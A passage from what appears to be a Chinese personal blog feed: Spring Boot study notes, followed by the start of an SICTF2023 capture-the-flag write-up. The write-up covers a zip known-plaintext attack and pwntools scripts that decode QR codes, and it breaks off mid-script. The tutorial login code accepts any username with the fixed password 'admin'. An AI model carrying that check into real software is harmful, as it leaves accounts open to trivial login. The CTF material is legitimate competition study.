class="hljs-comment">//标明这是配置类</span><span class="hljs-variable">@Bean</span>     <span class="hljs-comment">//给容器中添加组件</span><span class="hljs-variable">@Component</span>   <span class="hljs-comment">//注册</span><span class="hljs-variable">@Controller</span>、<span class="hljs-variable">@Service</span>、<span class="hljs-variable">@Repository</span><span class="hljs-variable">@ComponentScan</span>、<span class="hljs-variable">@Import</span><span class="hljs-variable">@ConditionalOnxxxxx</span>满足Conditional指定的条件，则进行组件注入<span class="hljs-variable">@ImportResource</span>(<span class="hljs-string">&quot;classpath:beans.xml&quot;</span>)<span class="hljs-variable">@ConfigurationProperties</span>(prefix=<span class="hljs-string">&quot;&quot;</span>)    <span class="hljs-comment">//能够在配置文件中赋值</span><span class="hljs-variable">@AutoConfigurationPackage</span><span class="hljs-variable">@Import</span>(AutoConfigurationImportSelector.class)SpringBoot先加载所有的自动配置类 xxxxxAutoConfiguration每个自动配置类按照条件进行生效，默认都会绑定配置文件指定的值。xxxxProperties里面拿。xxxProperties和配置文件进行了绑定生效的配置类就会给容器中装配很多组件</code></pre></div><div class="code-wrapper"><pre><code class="hljs dts">设置静态资源访问目录<span class="hljs-symbol"></span><span class="hljs-symbol">spring:</span><span class="hljs-symbol">  mvc:</span>    static-path-pattern: <span class="hljs-keyword">/res/</span>**</code></pre></div><p>启动程序主要是这三个东西<code>@SpringBootApplication</code>、<code>SpringApplication</code>和<code>run</code></p><p>充当配置文件的<code>application.properties</code>也可以是<code>application.yml</code></p><p>在启动程序Application的同级目录下创建controller文件夹，在这写有关路由的东西</p><p>@Controller (返回页面)     @RestController(返回内容)</p><p>在<code>application.properties</code>中能配置端口<code>server.port=8081</code></p><p>自动装配原理</p><p>yaml</p><div class="code-wrapper"><pre><code class="hljs applescript">大小写敏感使用缩进表示层级关系缩进不允许使用<span class="hljs-literal">tab</span>，只允许空格缩进的空格数不重要，只要同级元素左对齐即可<span class="hljs-comment">#表示注释</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Person</span><span class="hljs-punctuation">:</span>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zero$&#123;random.uuid&#125;&#125;</span>  <span class="hljs-attribute">age</span><span class="hljs-punctuation">:</span> <span class="hljs-string">$&#123;random.int&#125;</span>  <span class="hljs-attribute">birth</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2018/11/02</span>  <span class="hljs-attribute">dog</span><span class="hljs-punctuation">:</span>    <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">wow</span>    <span class="hljs-attribute">age</span><span class="hljs-punctuation">:</span> <span class="hljs-string">12</span><span class="hljs-attribute">server</span><span class="hljs-punctuation">:</span>  <span class="hljs-attribute">port</span><span class="hljs-punctuation">:</span> <span class="hljs-string">8082</span><span class="hljs-attribute">dog</span><span class="hljs-punctuation">:</span>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">pop</span>  <span class="hljs-attribute">age</span><span class="hljs-punctuation">:</span> <span class="hljs-string">321</span><span class="hljs-comment">#Human: [&quot;myname&quot;,&quot;myage&quot;,&quot;nothing&quot;]</span><span class="hljs-comment">#Hulman: [&quot;myname&quot;,&quot;youage&quot;,&quot;everything&quot;,[1,2,3]]</span><span class="hljs-attribute">Hulman</span><span class="hljs-punctuation">:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">myname</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">youage</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">everything</span>  <span class="hljs-bullet">-</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">1</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">2</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">3</span>      <span class="hljs-comment">#companies: [&#123;id: 1,name: asd&#125;,&#123;id: 2,name: sdf&#125;]</span><span class="hljs-attribute">companies</span><span class="hljs-punctuation">:</span>  <span class="hljs-bullet">-</span>    <span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span>    <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">asd</span>  <span class="hljs-bullet">-</span>    <span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span>    <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">sdf</span><span class="hljs-attribute">boolean</span><span class="hljs-punctuation">:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">true</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">false</span><span class="hljs-attribute">float</span><span class="hljs-punctuation">:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">3.14</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">1.14</span><span class="hljs-attribute">int</span><span class="hljs-punctuation">:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">1</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">2</span></code></pre></div><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><p>使用Spring的<code>@Value</code>注解进行赋值，并且配合<code>@Component</code>注解注册bean</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913163225847.png" alt="image-20230913163225847"></p><p>yaml配置文件赋值</p><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-meta">@ConfigurationProperties(prefix = <span class="hljs-string">&quot;dog&quot;</span>)</span></code></pre></div><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913163400091.png" alt="image-20230913163400091"></p><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">dog:</span><span class="hljs-symbol">  name:</span> pop  <span class="hljs-symbol">  age:</span> <span class="hljs-number">321</span><span class="hljs-meta">#（注意空格）</span></code></pre></div><p>properties配置文件</p><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-meta">@PropertySource(<span class="hljs-string">&quot;classpath:user.properties&quot;</span>)</span></code></pre></div><h3 id="松散绑定"><a href="#松散绑定" class="headerlink" title="松散绑定"></a>松散绑定</h3><p>yml中写<code>last-name</code> 与<code>lastName</code>是一样的，<code>-</code>后面跟着的字母默认是大写的</p><h3 id="JSR303校验"><a href="#JSR303校验" class="headerlink" title="JSR303校验"></a>JSR303校验</h3><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@Validated</span>   <span class="hljs-variable">@Email</span>()   private String name;</code></pre></div><p>一般使用Pattern() 正则匹配</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164032098.png" alt="image-20230913164032098"></p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164049132.png" alt="image-20230913164049132"></p><h3 id="多个配置文件位置"><a href="#多个配置文件位置" class="headerlink" title="多个配置文件位置"></a>多个配置文件位置</h3><p>默认选择顺序</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164744829.png" alt="image-20230913164744829"></p><p>主动选择激活配置   spring.profiles.active&#x3D;</p><p>application-名字.properties</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913165341467.png" alt="image-20230913165341467"></p><p>选择application-test.properties的配置</p><div class="code-wrapper"><pre><code class="hljs yaml"><span class="hljs-comment">#application.yml</span><span class="hljs-attr">spring:</span>  <span class="hljs-attr">profiles:</span>    <span class="hljs-attr">active:</span> <span class="hljs-string">dev</span>   <span class="hljs-string">//选择执行名字为dev的配置</span><span class="hljs-attr">server:</span>  <span class="hljs-attr">port:</span> <span class="hljs-number">8081</span><span class="hljs-comment">#(---不是为了好看画的、起到分隔的作用)</span><span class="hljs-meta">---</span><span class="hljs-attr">server:</span>  <span class="hljs-attr">port:</span> <span class="hljs-number">8082</span>     <span class="hljs-attr">spring:</span>  <span class="hljs-attr">profiles:</span> <span class="hljs-string">dev</span>   <span class="hljs-string">//名字</span><span class="hljs-meta">---</span><span class="hljs-attr">server:</span>  <span class="hljs-attr">port:</span> <span class="hljs-number">8083</span><span class="hljs-attr">spring:</span>  <span class="hljs-attr">profiles:</span> <span class="hljs-string">test</span></code></pre></div><h3 id="自动装配"><a href="#自动装配" class="headerlink" title="自动装配"></a>自动装配</h3><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-comment">//标注这是一个配置类</span><span class="hljs-variable">@Configuration</span>()   <span class="hljs-variable">@EnableConfigurationProperties</span>()<span class="hljs-comment">//根据不同的条件来判断当前配置是否生效</span><span class="hljs-variable">@ConditionalOnWebApplication</span>()<span class="hljs-variable">@ConditionalOnClass</span>()<span class="hljs-variable">@ConditionalOnProperty</span>()</code></pre></div><p>xxxxAutoConfiguration：自动配置类；给容器中添加组件</p><p>xxxxProperties:封装配置文件中相关属性</p><p>而相关属性我们可以使用配置文件进行修改</p><h2 id="web开发"><a href="#web开发" class="headerlink" title="web开发"></a>web开发</h2><p>webjars    </p><p>获取静态资源resources下放public、static、resources</p><p>优先级 resources &gt; static &gt; public</p><p>首页：在三个目录下寻找<code>index.html</code></p><p>图标：2.2版本没有，2.1版本放在三个任意一个目录下<code>favicon.ico</code></p><p>@Controller    .html文件放在template目录下</p><h3 id="thymeleaf-模板"><a href="#thymeleaf-模板" class="headerlink" title="thymeleaf 模板"></a>thymeleaf 模板</h3><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml">*</span><span class="hljs-template-variable">&#123;…&#125;</span><span class="language-xml">也可和$</span><span class="hljs-template-variable">&#123;…&#125;</span><span class="language-xml">混用，星号语法对选定对象而不是整个上下文评估表达式，也就是说，只要没有选定的对象，美元($</span><span class="hljs-template-variable">&#123;…&#125;</span><span class="language-xml">)和星号(*</span><span class="hljs-template-variable">&#123;...&#125;</span><span class="language-xml">)的语法就完全一样。</span><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:object</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;name&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>赛<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;age&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Detail: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;detail&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>好好学习<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml">//等价于</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> &gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;user.name&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>赛<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.age&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Detail: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.detail&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>好好学习<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></code></pre></div><p>th:utext&#x3D;”${msg}”         <code>&lt;h1&gt;123&lt;/h1&gt;</code>能够被成功解析</p><p>${对象.get方法名}</p><p>th:each&#x3D;”user:${users}” th:text&#x3D;”${user}”</p><p>MVC配置</p><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyMvcConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">WebMvcConfigurer</span> </span>&#123;    <span class="hljs-meta">@Bean</span>    <span class="hljs-keyword">public</span> <span class="hljs-function">ViewResolver <span class="hljs-title">myview</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> MyViewResolver();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyViewResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ViewResolver</span></span>&#123;        <span class="hljs-meta">@Override</span>        <span class="hljs-keyword">public</span> <span class="hljs-function">View <span class="hljs-title">resolveViewName</span><span class="hljs-params">(String viewName, Locale locale)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;        &#125;    &#125;&#125;</code></pre></div><h2 id="员工管理系统"><a href="#员工管理系统" class="headerlink" title="员工管理系统"></a>员工管理系统</h2><p>所有页面的静态资源都需要使用thymeleaf接管（）</p><p>标上xmlns:th&#x3D;”<a href="http://www.thymeleaf.org/">http://www.thymeleaf.org</a>“ ，以及修改href和src….等本地链接</p><p>th:href    th:src     th:link  @{&#x2F;}</p><h3 id="国际化"><a href="#国际化" class="headerlink" title="国际化  #{}"></a>国际化  #{}</h3><p>即页面的中英文转化</p><p>先创建<code>login.properties</code>，再创建<code>login_zh_CN.properties</code></p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230914183413701.png" alt="image-20230914183413701"></p><p>然后设置信息</p><p>设置完后spring.messages.basename&#x3D;i18n.login</p><p>然后在html中对应的显示位置     添加 th:xx&#x3D;”#{}” </p><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">th:</span>href=<span class="hljs-string">&quot;@&#123;/index.html(l=zh_CN)&#125;&quot;</span><span class="hljs-symbol">th:</span>href=<span class="hljs-string">&quot;@&#123;/index.html(l=en_US)&#125;&quot;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">点击按钮转换中英文，设置组件LocaleResolverpublic <span class="hljs-keyword">class</span> myLocaleResolver implements LocaleResolver &#123;    @Override    public Locale resolve<span class="hljs-constructor">Locale(HttpServletRequest <span class="hljs-params">request</span>)</span> &#123;        String language = request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;l&quot;</span>)</span>;        Locale locale = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Locale</span>.</span></span>get<span class="hljs-constructor">Default()</span>;        <span class="hljs-keyword">if</span> (!<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">StringUtils</span>.</span></span>is<span class="hljs-constructor">Empty(<span class="hljs-params">language</span>)</span>)&#123;            <span class="hljs-comment">//zh_CN</span>            String<span class="hljs-literal">[]</span> s = language.split(<span class="hljs-string">&quot;_&quot;</span>);            <span class="hljs-comment">//语言，国家</span>            locale = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Locale(<span class="hljs-params">s</span>[0],<span class="hljs-params">s</span>[1])</span>;        &#125;        return locale;    &#125;    @Override    public void set<span class="hljs-constructor">Locale(HttpServletRequest <span class="hljs-params">request</span>, HttpServletResponse <span class="hljs-params">response</span>, Locale <span class="hljs-params">locale</span>)</span> &#123;    &#125;&#125;</code></pre></div><p>然后在自定义的myMvcConfig中放入@Bean中</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@Bean</span><span class="hljs-keyword">public</span> <span class="hljs-title class_">LocaleResolver</span> <span class="hljs-title function_">localeResolver</span>(<span class="hljs-params"></span>)&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">myLocaleResolver</span>();&#125;</code></pre></div><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">loginController</span> &#123;    <span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/login&quot;</span>)    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;username&quot;</span>) <span class="hljs-built_in">String</span> username, <span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;password&quot;</span>) <span class="hljs-built_in">String</span> password, Model model</span>)&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isEmpty</span>(username) &amp;&amp; <span class="hljs-string">&quot;admin&quot;</span>.<span class="hljs-title function_">equals</span>(password))&#123;            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;            <span class="hljs-comment">//先在mvc中添加映射，然后跳转</span>            <span class="hljs-comment">//return &quot;redirect:/main.html&quot;; </span>        &#125;        <span class="hljs-keyword">else</span> &#123;        <span class="hljs-comment">//提示信息</span>            model.<span class="hljs-title function_">addAttribute</span>(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;用户名或密码错误&quot;</span>);            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;        &#125;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs routeros">&lt;p th:<span class="hljs-attribute">text</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;msg&#125;</span>&quot;</span> th:<span class="hljs-attribute">if</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;not #strings.isEmpty(msg)&#125;</span>&quot;</span>&gt;&lt;/p&gt;</code></pre></div><h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">loginInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HandlerInterceptor</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object <span class="hljs-keyword">handler</span>)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        <span class="hljs-comment">//获取session</span>        Object loginuser = request.getSession().getAttribute(<span class="hljs-string">&quot;loginuser&quot;</span>);        <span class="hljs-keyword">if</span> (loginuser==<span class="hljs-keyword">null</span>)&#123;            request.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;请先登录&quot;</span>);          request.getRequestDispatcher(<span class="hljs-string">&quot;/login.html&quot;</span>).forward(request,response);          <span class="hljs-comment">//跳转</span>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        &#125;    &#125;&#125;</code></pre></div><p>mvc中添加</p><div class="code-wrapper"><pre><code class="hljs reasonml">@Overridepublic void add<span class="hljs-constructor">Interceptors(InterceptorRegistry <span class="hljs-params">registry</span>)</span> &#123;    registry.add<span class="hljs-constructor">Interceptor(<span class="hljs-params">new</span> <span class="hljs-params">loginInterceptor</span>()</span>).add<span class="hljs-constructor">PathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)</span>.exclude<span class="hljs-constructor">PathPatterns(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;/login.html&quot;</span>,<span class="hljs-string">&quot;/about.html&quot;</span>,<span class="hljs-string">&quot;/contact.html&quot;</span>,<span class="hljs-string">&quot;/js/**&quot;</span>,<span class="hljs-string">&quot;/css/*&quot;</span>,<span class="hljs-string">&quot;/img/*&quot;</span>)</span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/login.html&quot;</span>)<span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;username&quot;</span>) <span class="hljs-built_in">String</span> username, <span class="hljs-meta">@RequestParam</span>(<span class="hljs-string">&quot;password&quot;</span>) <span class="hljs-built_in">String</span> password, Model model, HttpSession session</span>)&#123;    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">StringUtils</span>.<span class="hljs-title function_">isEmpty</span>(username) &amp;&amp; <span class="hljs-string">&quot;admin&quot;</span>.<span class="hljs-title function_">equals</span>(password))&#123;        session.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;loginuser&quot;</span>,username);        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:index.html&quot;</span>;</code></pre></div><h2 id="员工列表"><a href="#员工列表" class="headerlink" title="员工列表"></a>员工列表</h2><p>提取公共页面</p><p>把相同的代码添加一个属性   th:fragment&#x3D;”sidebar”</p><p>调用  th:replace&#x3D;”~{commons&#x2F;commons::topbar}”    &#x2F;&#x2F;定义属性的位置</p><p>高亮</p><p> ()传递参数  ~{commons&#x2F;commons::topbar(active&#x3D;”index.html”)}</p><p><code>th:xx=&quot;$&#123;active==&#39;index.html&#39;?&#39;nav-link active&#39;:&#39;nav-link&#39;&#125;&quot;</code>    三元运算符判断是否高亮</p><p>展示员工界面</p><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;user:$</span></span></span><span class="hljs-template-variable">&#123;users&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getId()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getName()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getAge()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getId()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user.getId()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span></code></pre></div><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sictf2023</title>
    <link href="/2023/09/10/sictf2023/"/>
    <url>/2023/09/10/sictf2023/</url>
    
    <content type="html"><![CDATA[<h1 id="SICTF2023"><a href="#SICTF2023" class="headerlink" title="SICTF2023"></a>SICTF2023</h1><p>就记录一些不会的题</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h3><p>明文攻击+lsb隐写（010打开就行）</p><div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> -n <span class="hljs-string">&quot;89504e470d0a1a0a0000000d49484452&quot;</span> |xxd -r -<span class="hljs-keyword">ps</span> &gt; key.txt</code></pre></div><p><img src="/2023/09/10/sictf2023/image-20230910160932339.png" alt="image-20230910160932339"></p><p><img src="/2023/09/10/sictf2023/image-20230910161008575.png" alt="image-20230910161008575"></p><p>我的当时思路：</p><p>压缩包有密码，尝试伪加密，破解后显示crc错误，自己构造一个带图片的压缩包，对比发现原压缩包图片内容没有文件头部分，然后就尝试自己加，但是宽高不知道，crc写不了，最终也没有办法了</p><h3 id="QR-QR-QR"><a href="#QR-QR-QR" class="headerlink" title="QR_QR_QR"></a>QR_QR_QR</h3><p>这个当时没时间写了,结束后也想自己尝试下，但还是失败了（才知道是python的问题，不是我的。。。。。）</p><p>自己的想法：</p><p>很明显01转二维码（第一次在不知道wp的情况下写脚本），成功后以为每次都一样，但是多次尝试后发现是不一样的，然后就像提示说的使用pwntool，还挺简单的，接着关键一步就是识别二维码的脚本，网上发现无非就是两种(pyzbar库和cv2库)，但我使用都出了问题</p><p>看了眼wp，基本是一样的，但是因为pyzbar库报错不能成功，服了。。。。</p><div class="code-wrapper"><pre><code class="hljs elm"><span class="hljs-title">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-title">from</span> <span class="hljs-type">PIL</span> <span class="hljs-keyword">import</span> Image<span class="hljs-title">from</span> pyzbar.pyzbar <span class="hljs-keyword">import</span> decode<span class="hljs-title">img</span> = <span class="hljs-type">Image</span>.new(<span class="hljs-string">&quot;RGB&quot;</span>,(<span class="hljs-number">115</span>,<span class="hljs-number">115</span>))<span class="hljs-title">p</span> = remote(<span class="hljs-string">&quot;host&quot;</span>,<span class="hljs-keyword">port</span>)for i in range(115):    a = p.recvline().strip().decode()    for j in range(115):        if(a[j]==&#x27;0&#x27;):            img.putpixel((i,j),(255,255,255))        else:            img.putpixel((i,j),(0,0,0))p.sendline(decode(img)[0][0])</code></pre></div><p>应该能成功，失败的话自己网上找一下识别二维码的代码去替换一下</p><p>看了WP说还要解1000次才出flag。。。。。。</p><p>别人的完整WP</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> cv2<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<span class="hljs-keyword">from</span> pyzbar.pyzbar <span class="hljs-keyword">import</span> decoder=remote(<span class="hljs-string">&quot;host&quot;</span>,port)count = <span class="hljs-number">0</span><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):    count += <span class="hljs-number">1</span>    <span class="hljs-built_in">print</span>(count)    data = <span class="hljs-built_in">list</span>(r.recvuntil(<span class="hljs-string">b&quot;P&quot;</span>)[:-<span class="hljs-number">1</span>])    <span class="hljs-comment"># 定义图像的宽度和高度（根据数据长度调整）</span>    width = <span class="hljs-number">116</span>    height = <span 